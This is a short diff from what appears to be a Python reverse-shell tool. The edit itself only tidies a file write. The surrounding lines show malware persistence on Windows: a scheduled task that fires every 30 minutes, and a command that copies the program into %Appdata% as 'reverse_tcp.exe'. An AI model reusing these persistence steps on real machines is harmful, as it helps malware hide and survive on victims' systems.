@@ -72,9 +72,9 @@ if (platform.system() == "Windows"):
         pass
     else:
         ### Create schtasks_template.xml
-        xml = open("%Appdata%\\schtasks_template.xml", "w+");
-        xml.write(generateScheduleTask(30))  ## interval 30 minutes
-        xml.close()
+        with open("%Appdata%\\schtasks_template.xml", "w") as xml:
+            xml.write(generateScheduleTask(30))  ## interval 30 minutes
+            # xml.close()
 
         ### Copy self to %Appdata% for Windows. (%Appdata%\reverse_tcp.exe)
         os.system("copy " + current_path + " %Appdata%\\reverse_tcp.exe")
